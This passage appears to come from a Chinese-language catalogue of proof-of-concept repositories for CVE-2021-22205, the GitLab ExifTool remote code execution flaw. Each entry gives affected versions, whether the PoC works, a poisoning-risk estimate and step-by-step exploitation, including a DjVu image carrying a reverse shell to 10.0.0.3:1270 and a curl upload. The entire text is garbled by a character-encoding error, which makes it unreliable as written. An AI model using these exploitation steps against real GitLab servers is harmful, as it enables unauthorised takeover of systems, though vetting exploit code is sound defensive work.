CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚ç”±äºŽGitLabæ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´äº†å‘½ä»¤æ³¨å…¥ã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolçš„æ¼æ´žæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç åˆ©ç”¨Docker Composeéƒ¨ç½²äº†ä¸€ä¸ªåŒ…å«æ¼æ´žçš„GitLab EE 13.9.5å®žä¾‹ï¼Œè¡¨æ˜Žè¯¥POCæ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥å¤çŽ°è¯¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
å°½ç®¡å¤§éƒ¨åˆ†ä»£ç çœ‹èµ·æ¥æ˜¯ä¸ºäº†å¤çŽ°æ¼æ´žï¼Œä½†ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£Žé™©ã€‚
*   `gitlab/entry.sh`è„šæœ¬æ·»åŠ äº†ä¸€ä¸ªåä¸º`eth1`çš„è™šæ‹Ÿç½‘ç»œæŽ¥å£ï¼Œå¹¶åˆ†é…äº†ä¸€ä¸ªå…¬ç½‘IPåœ°å€ã€‚è¿™æœ¬èº«å¹¶æ²¡æœ‰æ¶æ„ï¼Œä½†å¦‚æžœæ”»å‡»è€…æŽ§åˆ¶äº†GitLabå®žä¾‹ï¼Œåˆ™å¯èƒ½åˆ©ç”¨æ­¤æŽ¥å£è¿›è¡Œéšè”½é€šä¿¡æˆ–æ•°æ®æ³„éœ²ã€‚å¯èƒ½æ€§ä¸º10%ã€‚
* `gitlab/dummy/backup.txt`åŒ…å«äº†ä¸€ä¸ªé»˜è®¤çš„ç”¨æˆ·åå¯†ç ,å¦‚æžœè¢«åˆ©ç”¨,å­˜åœ¨å®‰å…¨é£Žé™©ã€‚å¯èƒ½æ€§ä¸º10%.

æ€»ä½“çš„æŠ•æ¯’é£Žé™©è¯„ä¼°ä¸º20%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…éœ€è¦æž„å»ºä¸€ä¸ªæ¶æ„å›¾åƒæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«åµŒå…¥çš„ExifToolå‘½ä»¤æ³¨å…¥Payloadã€‚
2.  æ”»å‡»è€…å°†æ¶æ„å›¾åƒä¸Šä¼ åˆ°æ˜“å—æ”»å‡»çš„GitLabå®žä¾‹ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡å¤´åƒä¸Šä¼ ã€é¡¹ç›®é™„ä»¶ç­‰ï¼‰ã€‚
3.  GitLabå°è¯•å¤„ç†å›¾åƒï¼Œè°ƒç”¨ExifToolã€‚
4.  ExifToolæ‰§è¡Œæ³¨å…¥çš„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [honypot/CVE-2021-22205](https://github.com/honypot/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #15

**æ¥æº**: [CVE-2021-22205-inspiringz_CVE-2021-22205.md](../2021/CVE-2021-22205-inspiringz_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼ŒæœªæŽˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žï¼Œå¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽGitLabæœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ åŒ…å«æ¶æ„ExifToolå…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶æ¥åˆ©ç”¨æ­¤æ¼æ´žã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´žä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œå¯ä»¥åˆ¤æ–­è¯¥POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯è¡¨æ˜Žè¯¥æ¼æ´žå½±å“å¤šä¸ªGitLabç‰ˆæœ¬ï¼Œä¸”CVSSè¯„åˆ†ä¸º10ï¼Œå±žäºŽä¸¥é‡çº§åˆ«ã€‚æ¼æ´žåˆ©ç”¨ä»£ç æ—¨åœ¨åˆ©ç”¨ExifToolåœ¨å¤„ç†æ¶æ„å›¾åƒæ—¶çš„å‘½ä»¤æ³¨å…¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆ©ç”¨CVE-2021-22205æ¼æ´žçš„exploitï¼Œç”¨äºŽè¿œç¨‹ä»£ç æ‰§è¡Œã€‚å…¶ä¸­å®šä¹‰äº†Sessionsç±»ä»¥æ–¹ä¾¿å‘é€HTTPè¯·æ±‚, å¹¶ä¸”ä½¿ç”¨äº†DNSLogï¼ŒPostBinï¼ŒRequestBinç­‰æœåŠ¡ä½œä¸ºéªŒè¯æ¼æ´žçš„æ–¹å¼ã€‚ä»£ç ä¸­`random_str`å‡½æ•°ç”¨äºŽç”Ÿæˆéšæœºå­—ç¬¦ä¸²ï¼Œè¿™åœ¨æ¼æ´žåˆ©ç”¨ä¸­å¾ˆå¸¸è§ï¼Œç”¨äºŽé¿å…è¢«ç®€å•è§„åˆ™æ£€æµ‹ã€‚`/tmp/5c52ea306e0854cb73063a671293313c/CVE-2021-22205.py`è¡¨æ˜Žè¯¥è„šæœ¬ä½äºŽä¸´æ—¶æ–‡ä»¶å¤¹ï¼Œå¯èƒ½è¡¨æ˜Žæ˜¯ä¸€ä¸ªæå–å‡ºæ¥çš„æˆ–è€…ä¸‹è½½çš„åˆ©ç”¨è„šæœ¬ã€‚ä»£ç ä¸­å­˜åœ¨å¯¹ä¸€äº›å¤–éƒ¨æœåŠ¡çš„è°ƒç”¨ï¼Œæ¯”å¦‚DNSLogï¼ŒRequestBinç­‰ï¼Œä½œè€…å¯èƒ½é€šè¿‡è¿™äº›æœåŠ¡æ¥æ”¶é›†ä¸€äº›ä¿¡æ¯ã€‚å› æ­¤ï¼Œå­˜åœ¨ä¸€å®šè¢«æŠ•æ¯’çš„é£Žé™©ï¼Œä¾‹å¦‚ä½œè€…åœ¨è„šæœ¬ä¸­åµŒå…¥æ¶æ„ä»£ç ï¼Œåˆ©ç”¨ç›®æ ‡æœåŠ¡å™¨çš„èµ„æºè¿›è¡ŒæŒ–çŸ¿æˆ–è€…å…¶ä»–æ¶æ„è¡Œä¸ºã€‚æ­¤å¤–ï¼ŒDNSLogå¦‚æžœè¢«æ¶æ„åŠ«æŒï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€‚ç»¼ä¸Šæ‰€è¿°ï¼Œå­˜åœ¨10%çš„æŠ•æ¯’å¯èƒ½æ€§ï¼Œè¯·ä»”ç»†å®¡è®¡ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **èŽ·å–CSRF Tokenå’ŒSession Cookieï¼š** æ¼æ´žåˆ©ç”¨çš„ç¬¬ä¸€æ­¥æ˜¯èŽ·å–æœ‰æ•ˆçš„CSRF Tokenå’ŒSession Cookieã€‚POCä»£ç é¦–å…ˆå°è¯•è®¿é—® `/users/sign_in`ã€`/help` æˆ– `/explore` é¡µé¢ï¼Œç„¶åŽä»Žä¸­æå–æ‰€éœ€çš„tokenå’Œcookieã€‚
2.  **ä¸Šä¼ æ¶æ„å›¾åƒï¼š** åˆ©ç”¨èŽ·å–çš„CSRF Tokenå’ŒSession Cookieï¼Œæ”»å‡»è€…å¯ä»¥ä¸Šä¼ ä¸€ä¸ªç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ã€‚è¯¥å›¾åƒæ–‡ä»¶çš„Exifå…ƒæ•°æ®ä¸­åŒ…å«æ¶æ„å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤å°†åœ¨GitLabæœåŠ¡å™¨ä¸Šç”±ExifToolæ‰§è¡Œã€‚
3.  **è¿œç¨‹ä»£ç æ‰§è¡Œï¼š** å½“GitLabæœåŠ¡å™¨å°è¯•å¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼ŒExifToolä¼šæ‰§è¡Œå›¾åƒå…ƒæ•°æ®ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
4.  **OOBï¼ˆå¸¦å¤–ï¼‰éªŒè¯ï¼š**  POCä»£ç åˆå§‹åŒ–äº†DNSLogï¼ŒRequestBinç­‰æœåŠ¡ï¼Œç”¨äºŽéªŒè¯æ¼æ´žã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡DNSæŸ¥è¯¢æˆ–è€…HTTPè¯·æ±‚çš„æ–¹å¼æ¥ç¡®å®šå‘½ä»¤æ˜¯å¦æˆåŠŸæ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [inspiringz/CVE-2021-22205](https://github.com/inspiringz/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #16

**æ¥æº**: [CVE-2021-22205-keven1z_CVE-2021-22205.md](../2021/CVE-2021-22205-keven1z_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯å¯¼è‡´å®Œå…¨ç³»ç»ŸæŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œç›®æ ‡GitLabå®žä¾‹å¯ä»Žç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå½±å“ GitLab CE/EE çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žå­˜åœ¨äºŽå›¾åƒæ–‡ä»¶è§£æžè¿‡ç¨‹ä¸­ï¼Œç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„ POC ä»£ç æœ‰æ•ˆã€‚å®ƒåˆ©ç”¨ ExifTool ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œé€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„ DJVU å›¾åƒæ–‡ä»¶æ¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
POC ä»£ç ä¸­å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£Žé™©ã€‚é£Žé™©ä¸º10%ã€‚

ä»¥ä¸‹æ˜¯å¯¹ä»£ç ä¸­å¯èƒ½å­˜åœ¨çš„æŠ•æ¯’é£Žé™©ç‚¹çš„åˆ†æžï¼š

*   **ç¡¬ç¼–ç çš„User-Agent:**  POC ä½¿ç”¨äº† `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36`ã€‚è¿™å¯èƒ½æ˜¯ä¸ºäº†ç»•è¿‡æŸäº›ç®€å•çš„ WAF è§„åˆ™ï¼Œä½†ä¹Ÿå¯èƒ½å¯¼è‡´æŒ‡çº¹è¯†åˆ«ï¼Œä»Žè€Œä½¿æ”»å‡»æ›´å®¹æ˜“è¢«æ£€æµ‹ã€‚è™½ç„¶ä¸ç®—æ¶æ„ï¼Œä½†ä¸å¤Ÿçµæ´»ï¼Œå¯èƒ½å½±å“åˆ©ç”¨æ•ˆæžœã€‚
*   **Payloadå®šæ­»ï¼Œç¼ºå°‘éšæœºæ€§ï¼š**POCä¸­ç”¨äºŽè§¦å‘æ¼æ´žçš„DJVUæ–‡ä»¶å†…å®¹ç›¸å¯¹å›ºå®šã€‚è™½ç„¶ä¿®æ”¹äº†commandéƒ¨åˆ†,ä½†æ˜¯å¦‚æžœç›®æ ‡ç³»ç»Ÿå¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œæ›´ä¸¥æ ¼çš„æ ¡éªŒï¼Œè¿™ç§å›ºå®šçš„Payloadå¯èƒ½ä¼šå¯¼è‡´åˆ©ç”¨å¤±è´¥ã€‚å¦‚æžœpayloadåŠ å…¥éšæœºåŒ–,å¯¹æ”»å‡»æ›´åŠ æœ‰åˆ©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆå‘é€ä¸€ä¸ª GET è¯·æ±‚åˆ° `/users/sign_in` èŽ·å– CSRF tokenã€‚è¯¥tokenç”¨äºŽåŽç»­çš„postè¯·æ±‚çš„è®¤è¯ã€‚
2.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚è¯¥å›¾åƒæ–‡ä»¶åœ¨ metadata å­—æ®µä¸­åµŒå…¥æ¶æ„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…æž„é€ ä¸€ä¸ª multipart/form-data è¯·æ±‚ï¼Œå°†æ¶æ„å›¾åƒæ–‡ä»¶ä½œä¸ºæ–‡ä»¶ä¸Šä¼ åˆ° `/uploads/user` è·¯å¾„ã€‚
4.  å½“ GitLab å¤„ç†ä¸Šä¼ çš„å›¾åƒæ—¶ï¼ŒExifTool ä¼šè¢«è°ƒç”¨æ¥æå–å›¾åƒå…ƒæ•°æ®ã€‚ç”±äºŽå›¾åƒæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ï¼ŒExifTool ä¼šæ‰§è¡Œè¿™äº›å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
5.  åˆ©ç”¨ä»£ç ä¸­ï¼Œcommandå˜é‡å¯ä»¥å®šä¹‰åå¼¹shellæˆ–è€…æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [keven1z/CVE-2021-22205](https://github.com/keven1z/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #17

**æ¥æº**: [CVE-2021-22205-momika233_cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-.md](../2021/CVE-2021-22205-momika233_cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** å¯ä»Žç½‘ç»œè®¿é—®å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹ï¼Œä¸”å®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žæ˜¯ GitLab CE/EE ç‰ˆæœ¬ä¸­å­˜åœ¨çš„ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚æ¼æ´žåŽŸå› æ˜¯ GitLab æœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼ŒDjVuæ–‡ä»¶ï¼‰åˆ©ç”¨ ExifTool ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä¸¤ä¸ªä¸»è¦æ­¥éª¤ï¼š
1.  **ç”ŸæˆPayloadï¼š**  PoC é¦–å…ˆç”Ÿæˆä¸€ä¸ªåä¸º lol.jpg çš„ DjVu å›¾åƒï¼Œè¯¥å›¾åƒåŒ…å«ä¸€ä¸ªåå‘ shell çš„ Payloadã€‚è¯¥Payloadä½¿ç”¨ `base64` ç¼–ç å¹¶æ‹¼æŽ¥shellå‘½ä»¤åˆ°æ–‡ä»¶æœ«å°¾. Payloadå»ºç«‹ä¸Ž `10.0.0.3` ç«¯å£ `1270` çš„åå‘è¿žæŽ¥ï¼Œå¹¶åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤ã€‚
2.  **å‘é€Payloadï¼š**  PoC ä½¿ç”¨ `curl` å‘½ä»¤å°†ç”Ÿæˆçš„ lol.jpg æ–‡ä»¶ä¸Šä¼ åˆ° GitLab å®žä¾‹ã€‚`-F 'file=@lol.jpg'` å‚æ•°å°†æ–‡ä»¶ä½œä¸º POST è¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€ã€‚`http://10.0.0.7/$(openssl rand -hex 8)` è¡¨ç¤ºæ”»å‡»è€…å¯ä»¥é€šè¿‡ä»»æ„ endpoint è§¦å‘è¯¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
é€šè¿‡åˆ†æžPoCä»£ç ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’è¿¹è±¡ã€‚è¯¥ä»£ç æ—¨åœ¨ç”Ÿæˆå¹¶ä¸Šä¼ ä¸€ä¸ªåŒ…å«åå‘ shell çš„å›¾åƒæ–‡ä»¶ã€‚æ‰€æœ‰æ“ä½œéƒ½æ˜¯ä¸ºäº†åˆ©ç”¨æ¼æ´žï¼Œå¹¶æ²¡æœ‰æ·»åŠ ä»»ä½•ä¸Žæ¼æ´žåˆ©ç”¨æ— å…³çš„æ¶æ„ä»£ç ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¯„ä¼°ä¸º 0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š
1.  æ”»å‡»è€…æž„é€ æ¶æ„çš„DjVuå›¾åƒï¼Œè¯¥å›¾åƒåµŒå…¥äº†å‘½ä»¤æ³¨å…¥Payloadã€‚
2.  æ”»å‡»è€…é€šè¿‡ä¸Šä¼ åŠŸèƒ½ï¼Œå°†æž„é€ çš„å›¾åƒä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹ã€‚ç”±äºŽæœªè¿›è¡Œå……åˆ†çš„éªŒè¯ï¼Œä¸Šä¼ è¿‡ç¨‹ä¸ä¼šé˜»æ­¢æ¶æ„å›¾åƒã€‚
3.  GitLabåœ¨å¤„ç†å›¾åƒæ—¶ï¼Œè°ƒç”¨ExifToolç­‰å›¾åƒå¤„ç†å·¥å…·ã€‚
4.  ExifToolè§£æžæ¶æ„å›¾åƒï¼Œæ‰§è¡Œå…¶ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
5.  æ”»å‡»è€…é€šè¿‡åå‘shellèŽ·å–å¯¹GitLabæœåŠ¡å™¨çš„è®¿é—®æƒé™ï¼Œä»Žè€Œå®žçŽ°å¯¹ç³»ç»Ÿçš„æŽ§åˆ¶ã€‚

**é¡¹ç›®åœ°å€:** [momika233/cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-](https://github.com/momika233/cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #18

**æ¥æº**: [CVE-2021-22205-mr-r3bot_Gitlab-CVE-2021-22205.md](../2021/CVE-2021-22205-mr-r3bot_Gitlab-CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´å®Œå…¨æŽ§åˆ¶æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç›®æ ‡GitLabå®žä¾‹è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

è¯¥æ¼æ´žå­˜åœ¨äºŽGitLabä¸­ï¼Œç”±äºŽExifToolåœ¨å¤„ç†å›¾åƒæ–‡ä»¶æ—¶æœªæ­£ç¡®éªŒè¯ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶è§¦å‘æ¼æ´žã€‚å…·ä½“æ¥è¯´ï¼ŒGitLabä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾åƒï¼Œè€ŒExifToolåœ¨å¤„ç†DjVuæ ¼å¼æ–‡ä»¶æ—¶ï¼Œå­˜åœ¨ä»£ç æ³¨å…¥æ¼æ´žã€‚æ”»å‡»è€…æž„é€ åŒ…å«æ¶æ„ä»£ç çš„DjVuæ–‡ä»¶ï¼Œå°†å…¶ä¸Šä¼ è‡³GitLabï¼Œå½“GitLabå°è¯•è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„ä»£ç å°†è¢«æ‰§è¡Œï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç åˆ©ç”¨äº†CVE-2021-22205æ¼æ´žï¼Œç»éªŒè¯æœ‰æ•ˆã€‚å®ƒé€šè¿‡åˆ›å»ºåŒ…å«æ¶æ„å…ƒæ•°æ®çš„DjVuå›¾åƒæ–‡ä»¶ï¼Œç„¶åŽå°†å…¶ä¸Šä¼ åˆ°GitLabå®žä¾‹ã€‚å½“GitLabå¤„ç†è¯¥å›¾åƒæ—¶ï¼ŒExifToolä¼šæ‰§è¡ŒåµŒå…¥åœ¨å…ƒæ•°æ®ä¸­çš„å‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
åˆ†æžæä¾›çš„POCä»£ç ï¼Œæ²¡æœ‰å‘çŽ°ä»»ä½•éšè—çš„æŠ•æ¯’ä»£ç ã€‚è¯¥ä»£ç çš„åŠŸèƒ½æ˜Žç¡®ï¼Œå³åˆ©ç”¨CVE-2021-22205æ¼æ´žæ‰§è¡Œå‘½ä»¤ã€‚æ‰€æœ‰æ“ä½œéƒ½åœ¨è„šæœ¬ä¸­æ¸…æ™°å¯è§ï¼Œæ²¡æœ‰æ··æ·†æˆ–éšè—è¡Œä¸ºã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦èŽ·å–ç›®æ ‡GitLabå®žä¾‹çš„URLã€‚
2.  ç„¶åŽï¼Œæ”»å‡»è€…ä½¿ç”¨POCè„šæœ¬ç”Ÿæˆä¸€ä¸ªåŒ…å«æ¶æ„DjVuå…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ã€‚
3.  è„šæœ¬ä½¿ç”¨`djvumake`å‘½ä»¤åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„payloadçš„`rce.djvu`æ–‡ä»¶ï¼Œå†å°†å…¶é‡å‘½åä¸º`rce.jpg`ã€‚
4.  POCä»£ç é€šè¿‡æ¨¡æ‹Ÿæ–‡ä»¶ä¸Šä¼ è¯·æ±‚ï¼Œå°†ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°GitLabå®žä¾‹ã€‚
5.  GitLabæŽ¥æ”¶åˆ°æ–‡ä»¶åŽï¼Œä¼šè°ƒç”¨ExifToolè¿›è¡Œå¤„ç†ï¼Œç”±äºŽExifToolå­˜åœ¨æ¼æ´žï¼Œå¯¼è‡´æ‰§è¡Œå›¾åƒæ–‡ä»¶ä¸­åµŒå…¥çš„æ¶æ„ä»£ç ã€‚
6.  æ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤å°†åœ¨GitLabæœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [mr-r3bot/Gitlab-CVE-2021-22205](https://github.com/mr-r3bot/Gitlab-CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #19

**æ¥æº**: [CVE-2021-22205-osungjinwoo_CVE-2021-22205-gitlab.md](../2021/CVE-2021-22205-osungjinwoo_CVE-2021-22205-gitlab.md)

## CVE-2021-22205-GitLab-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8, >=13.9, <13.9.6, >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œéœ€è¦ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žä¸”å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 5%

## è¯¦æƒ…

